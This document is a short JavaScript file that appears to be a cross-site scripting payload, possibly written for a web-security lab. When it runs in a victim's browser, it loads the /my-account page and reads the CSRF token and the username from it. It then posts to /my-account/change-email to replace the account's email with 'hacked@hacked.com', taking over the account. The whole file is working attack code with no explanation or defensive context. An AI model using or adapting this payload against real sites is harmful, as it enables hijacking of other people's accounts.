function findusername(hrefs){
    for (var i = 0; i < hrefs.length; i++){
        var herf = hrefs.item(i).href;
        if(herf.indexOf('/my-account?id=') > -1){
            return herf.split('=')[1];
        }
    }
    return null;
}

function accounttakeover(token){
    var param = 'csrf='+token+'&email='+'hacked@hacked.com';
    var req = new XMLHttpRequest();
    req.open('POST','/my-account/change-email',true);
    req.send(param);
}

var req_myaccount = new XMLHttpRequest();
req_myaccount.onreadystatechange=function(){
    if(req_myaccount.readyState == 4){
        var response = req_myaccount.responseText;
        var htmlResponse = new DOMParser().parseFromString(response,'text/html');
        var token = htmlResponse.getElementsByName('csrf')[0].value
        var herfs = htmlResponse.getElementsByTagName('a');
        var username = findusername(herfs);
        accounttakeover(token);
        console.log(username);
    }      
}
req_myaccount.open('GET','/my-account',true)
req_myaccount.send();

